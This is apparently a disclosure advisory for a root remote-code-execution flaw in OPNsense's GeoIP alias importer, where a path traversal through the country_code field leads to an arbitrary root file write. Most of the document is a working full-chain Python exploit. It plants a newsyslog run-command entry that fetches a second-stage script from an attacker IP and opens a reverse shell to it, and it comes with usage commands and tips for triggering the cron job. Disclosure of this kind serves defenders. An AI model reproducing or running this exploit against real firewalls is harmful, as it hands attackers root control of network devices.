# Root RCE via Arbitrary File Write in GeoIP Alias Importer

- Severity: Critical (9.9) - `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`
- Software: [OPNsense](https://github.com/OPNsense/core)
- Version: `<26.1.10`
- References:
- - [CVE-2026-57155](https://nvd.nist.gov/vuln/detail/CVE-2026-57155)
- - [GHSA-wjqq-rfmm-v5h3](https://github.com/opnsense/core/security/advisories/GHSA-wjqq-rfmm-v5h3)
- - [Blog Post](https://hackerask.com/posts/opnsense/)

## Summary

The Firewall Alias GeoIP importer downloads a country-IP database from a user supplied URL and unpacks it as root. The unsanitized `country_code` field inside the databases CSV is used as the name of the output file the importer writes. A malicious crafted database allows to write attacker-controlled content to an attacker-chosen path as root (directory traversal out of `/usr/local/share/GeoIP/alias`).

The whole chain is reachable by a non-administrative user holding only the `Firewall: Alias: Edit` privilege. The GeoIP source URL field has no host restriction, so the attacker can simply point it at a server they control. The arbitrary root file write can be escalated with the default `newsyslog` cronjob to a **remote code execution as root**.

**In practice:** A non-administrative user who only holds the `Firewall: Alias: Edit` privilege - whether a delegated user or an attacker who has obtained such an account - and who can reach the web interface, can point the GeoIP import at a server they control and via an unvalidated filename in the downloaded database, drop a newsyslog fragment that root's default hourly cron then executes. This escalates an alias-only account to full root control of the firewall.

I was able to reproduce the vulnerability on both version 26.1.6_2 and the latest version, 26.1.10.

## Details

### Root cause

The `src/opnsense/scripts/filter/lib/alias/geoip.py` script writes one file per provided country and names the file using the unsanitized `country_code` value taken directly from the downloaded GeoIP CSV.

The vulnerable function `process_zip()` (the path used by the PoC):

```python
# src/opnsense/scripts/filter/lib/alias/geoip.py
_target_dir = '/usr/local/share/GeoIP/alias'                 # line 46
...
country_code = country_codes[parts[1]]                       # line 88 - (uses the country_iso_code column from the locations CSV)
if country_code not in output_handles:
    output_handles[country_code] = open(
        '%s/%s-%s' % (cls._target_dir, country_code, proto), 'w')   # line 90-91 - WRITE SINK (country code can be abused for path traversal)
...
output_handles[country_code].write("%s\n" % parts[0])        # line 94 - file content (uses the network column from the block CSV)
```

`process_gzip()` has the identical unsanitized pattern (line 119-125).

A `country_code` such as `../../../../../../../../etc/newsyslog.conf.d/zzz_pwn` escapes the target directory and the file content is the attacker-controlled `network` column (`parts[0]`).

### Arbitrary File Write

Reaching the vulnerable write requires three authenticated requests (with the privilege `Firewall: Alias: Edit`).
The attacker first hosts a malicious GeoIP archive, then drives OPNsense to fetch and unpack it:

1. `POST /api/firewall/alias/set` - store the attacker-controlled GeoIP source URL in `config.xml`
2. `POST /api/firewall/alias/reconfigure` - runs `template reload OPNsense/Filter`, which renders the stored URL into `/usr/local/etc/filter_geoip.conf`
3. `POST /api/firewall/alias/update/geoip` - triggers the configd `update.geoip` action, which runs `geoip.py` as root (it downloads the archive from the attacker URL and unpacks it)

The served archive is a ZIP, containing two CSV files:

- a "locations" CSV (`*-locations-en.csv`) - column 5 (`country_code`) carries the path-traversal payload (e.g. `../../../../../tmp/poc`)
- a "blocks" CSV (`*-ipv4.csv`) - the `network` column contains the written file content, linked to the locations row via `geoname_id`

`geoip.py` builds the output path as `{target_dir}/{country_code}-{proto}` with no validation of `country_code`, so the traversed `country_code` allows to write a file as root with attacker-controlled content outside `/usr/local/share/GeoIP/alias` (BUT: the file always includes a `-IPv4`/`-IPv6` suffix).

### Escalation to root code execution

The arbitrary file write always appends a `-IPv4`/`-IPv6` suffix to the filename. To circumvent this restriction and escalate it to remote code execution, the PoC writes a `newsyslog` configuration fragment:

- `/etc/newsyslog.conf.d/zzz_pwn-IPv4` - a newsyslog entry with an `R` (run-command) action
- `/var/log/rotate_bait-IPv4` - a >1 KB log file so the entry rotates on the next newsyslog run

This is possible, because the default OPNsense image contains a `newsyslog` cronjob (`/etc/crontab`):

```
# Rotate log files every hour, if necessary.
0       *       *       *       *       root    newsyslog
```

`newsyslog` runs hourly as a root cronjob. It rotates our oversized log file and executes the injected `newsyslog` configuration entry, yielding root code execution.

(OPNsense includes `newsyslog.conf.d/*` with a `*`, so the `-IPv4` suffix does not prevent the fragment from being parsed)

## Proof of Concept

This is a full chain exploit to get an interactive root reverse shell (HTTP payload server + reverse-shell listener):

```python
#!/usr/bin/env python3
import io
import os
import re
import csv
import sys
import tty
import gzip
import select
import socket
import termios
import zipfile
import urllib3
import requests
import argparse
import threading
import http.server

urllib3.disable_warnings()
parser = argparse.ArgumentParser()
parser.add_argument("-b", "--base-url", default="https://192.168.1.1", help="OPNsense URL")
parser.add_argument("-u", "--user", default="root", help="OPNsense user with 'Firewall: Alias: Edit' privilege (Default: root)")
parser.add_argument("-p", "--password", default="opnsense", help="OPNsense user password (Default: opnsense)")
parser.add_argument("-a", "--attacker-ip", required=True, help="Attacker controlled server IP")
parser.add_argument("-w", "--http-port", default=18000, type=int, help="Open port for the web server (Default: 18000)")
parser.add_argument("-r", "--rev-port", default=1337, type=int, help="Open port for the reverse shell (Default: 1337)")
parser.add_argument("-f", "--format", choices=["zip", "gzip"], default="zip", help="Database archive format to serve (Default: zip)")
args = parser.parse_args()

BASE = args.base_url
USER, PWD = args.user, args.password
ATTACK_IP = args.attacker_ip
HTTP_PORT = args.http_port
SHELL_PORT = args.rev_port

# traversal targets (geoip.py appends '-IPv4'/'-IPv6') (the traversed dirs must already exist)
TRAVERSE = "../../../../../../../.."
CONF_PATH = f"{TRAVERSE}/etc/newsyslog.conf.d/zzz_pwn"
LOG_PATH = f"{TRAVERSE}/var/log/rotate_bait"

# Stage-1 (newsyslog `R` command)
STAGE1 = (
    "/usr/bin/true;"
    f"/usr/bin/fetch${{IFS}}-qo/tmp/.r${{IFS}}http://{ATTACK_IP}:{HTTP_PORT}/s;"
    "/bin/sh${IFS}/tmp/.r;:"
)

# Stage-2 reverse shell
STAGE2 = (
    "#!/bin/sh\n"
    "rm -f /tmp/.r 2>/dev/null\n"
    "exec python3 -c 'import socket,os,pty;"
    f's=socket.socket();s.connect(("{ATTACK_IP}",{SHELL_PORT}));'
    "[os.dup2(s.fileno(),f) for f in (0,1,2)];"
    'pty.spawn("/bin/sh")\'\n'
)

NEWSYSLOG_ENTRY = f"/var/log/rotate_bait-IPv4 644 1 1 * R {STAGE1}"
TRIGGER_PAD = "X" * 1400  # >1KB so size-based rotation fires on the next newsyslog run


def build_zip() -> bytes:
    # maps file locations with geoname_id->country_iso_code (-> traversal path)
    locations = "\n".join(
        [
            "geoname_id,locale_code,continent_code,continent_name,country_iso_code",
            f"1,en,EU,Europe,{CONF_PATH}",
            f"2,en,EU,Europe,{LOG_PATH}",
        ]
    )
    # writes file body into the network column
    blocks = "\n".join(
        [
            "network,geoname_id",
            f"{NEWSYSLOG_ENTRY},1",
            f"{TRIGGER_PAD},2",
        ]
    )
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("GeoLite2-Country-Locations-en.csv", locations)
        z.writestr("GeoLite2-Country-Blocks-IPv4.csv", blocks)
    return buf.getvalue()


def build_gzip() -> bytes:
    sio = io.StringIO()
    w = csv.writer(sio)
    w.writerow(["network", "country_code"])
    w.writerow([NEWSYSLOG_ENTRY, CONF_PATH])
    w.writerow([TRIGGER_PAD, LOG_PATH])
    return gzip.compress(sio.getvalue().encode())


if args.format == "zip":
    PAYLOAD_NAME = "db.zip"
    PAYLOAD_CTYPE = "application/zip"
    PAYLOAD_BYTES = build_zip()
else:
    PAYLOAD_NAME = "db.gz"
    PAYLOAD_CTYPE = "application/gzip"
    PAYLOAD_BYTES = build_gzip()


class AttackerWebServer(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path.startswith(f"/{PAYLOAD_NAME}"):
            self.send_response(200)
            self.send_header("Content-Type", PAYLOAD_CTYPE)
            self.send_header("Content-Disposition", f'attachment; filename="{PAYLOAD_NAME}"')
            self.end_headers()
            self.wfile.write(PAYLOAD_BYTES)
        elif self.path.startswith("/s"):
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(STAGE2.encode())
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, fmt, *args):
        pass


# Automatically signs the user in via the GUI and grabs the session CSRF token
def login(s: requests.Session):
    r = s.get(f"{BASE}/index.php", timeout=10)
    m = re.search(r'<input type="hidden" name="([A-Za-z0-9_-]+)" value="([A-Za-z0-9_-]+)" autocomplete="new-password"', r.text)
    if not m:
        sys.exit("[-] could not read login CSRF token")
    s.post(
        f"{BASE}/index.php",
        data={
            m.group(1): m.group(2),
            "usernamefld": USER,
            "passwordfld": PWD,
            "login": "1",
        },
        timeout=10,
    )
    r = s.get(f"{BASE}/ui/firewall/alias", timeout=10)
    t = re.search(r'"X-CSRFToken",\s*"([^"]+)"', r.text)
    if not t:
        sys.exit("[-] login failed / no session token")
    s.headers.update({"X-CSRFToken": t.group(1)})


# Starts the interactive shell
def interactive(conn: socket.socket):
    print(f"\n[+] ROOT shell connected from {conn.getpeername()[0]}", flush=True)
    old = termios.tcgetattr(sys.stdin)
    try:
        tty.setraw(sys.stdin.fileno())
        conn.sendall(b'export PS1="$(whoami)# "; id\n')
        while True:
            r, _, _ = select.select([sys.stdin, conn], [], [])
            if conn in r:
                data = conn.recv(4096)
                if not data:
                    break
                os.write(sys.stdout.fileno(), data)
            if sys.stdin in r:
                d = os.read(sys.stdin.fileno(), 4096)
                if not d:
                    break
                conn.sendall(d)
    finally:
        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old)
        print("\n[*] shell closed", flush=True)


def main():
    # 1) Launch Attacker Services (Serves the GeoIP archive, Stage 2 and Reverse Shell Listener)
    httpd = http.server.HTTPServer((ATTACK_IP, HTTP_PORT), AttackerWebServer)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    catcher = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    catcher.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    catcher.bind((ATTACK_IP, SHELL_PORT))
    catcher.listen(1)
    print(f"[*] http server on {ATTACK_IP}:{HTTP_PORT}")
    print(f"[*] reverse-shell listener on {ATTACK_IP}:{SHELL_PORT}")
    print(f"[*] serving {args.format} payload as {PAYLOAD_NAME}")

    # 2) EXPLOIT THE VULNERABILITY
    # 2.1) Login the user and get the CSRF token
    s = requests.Session()
    s.verify = False
    login(s)

    # 2.2) Stores geoip.url in config.xml
    r = s.post(
        f"{BASE}/api/firewall/alias/set",
        json={"alias": {"geoip": {"url": f"http://{ATTACK_IP}:{HTTP_PORT}/{PAYLOAD_NAME}"}}},
        timeout=15,
    )
    if not r.status_code == 200:
        sys.exit("[-] Failed to set the GeoIP URL")
    print("[+] set GeoIP URL:", r.status_code, r.text[:80])

    # 2.3) Reloads the template and render the config.xml
    r = s.post(f"{BASE}/api/firewall/alias/reconfigure", json={}, timeout=30)
    if not r.status_code == 200:
        sys.exit("[-] Failed reloading template")
    print("[+] reconfigure:", r.status_code)

    # 2.4) Downloads the archive from the configured GeoIP URL and performs the path-traversal write
    r = s.post(f"{BASE}/api/firewall/alias/update/geoip", json={}, timeout=60)
    if not r.status_code == 200:
        sys.exit(f"[-] Failed downloading the GeoIP {PAYLOAD_NAME} file.")
    print("[+] update/geoip (root write):", r.status_code, r.text[:120])

    # 3) Waiting for the exploit to be triggered by the newsyslog cronjob
    if args.format == "zip":
        conf_suffix, trig_suffix = "IPv4", "IPv4"
    else:
        proto_for = lambda network_value: "IPv6" if network_value.find(":") > 0 else "IPv4"
        conf_suffix = proto_for(NEWSYSLOG_ENTRY)
        trig_suffix = proto_for(TRIGGER_PAD)
    print(
        f"\n"
        f"[*] Root-written files (verify on console if you like):\n"
        f"      /etc/newsyslog.conf.d/zzz_pwn-{conf_suffix}   (newsyslog R-command entry)\n"
        f"      /var/log/rotate_bait-{trig_suffix}             (>1KB rotation trigger)\n"
        f"[*] The exploit fires on the next hourly newsyslog run (Trigger manually via: newsyslog -Fv)\n\n"
        f"[*] waiting for the root reverse shell on :{SHELL_PORT}...",
        flush=True,
    )

    try:
        conn, _ = catcher.accept()
    except KeyboardInterrupt:
        print("\n[-] aborted")
        return
    interactive(conn)


if __name__ == "__main__":
    main()
```

You can find the Proof of Concept [here](poc.py).
You have to change the attack ip and the credentials to a user with the `Firewall: Alias: Edit` privilege:

```shell
python3 poc.py -a 192.168.1.120 -u hackerask -p password
```

**Trigger timing:** The file write is immediate, but the `R`-command executes on the next hourly newsyslog run.

For an instant demonstration, force it with the `newsyslog` command.
Alternatively, set the clock to one minute before the hour rolls over: e.g. `date 202606221159.00`. Then wait for the minute to tick over to "00", which triggers the newsyslog cronjob. (Be sure to do this before running the exploit)

Here is a quick PoC showcase:

https://github.com/user-attachments/assets/7eea887b-d379-4ca0-8e76-88cdff498dfa

## Impact

A low-privileged firewall user (without admin privileges and no shell account) can:

- **write arbitrary files** with arbitrary content as **root** anywhere on the filesystem (into any pre-existing directory)
- escalate to **remote root code execution** via the included newsyslog technique

This is a full compromise of the firewall from a delegated, non-administrative user privilege.

## Credit

Jonas Ampferl at Hacking Cult GmbH <https://hackingcult.de/>

Blog Post with writeup and PoC: <https://hackerask.com/posts/opnsense/>
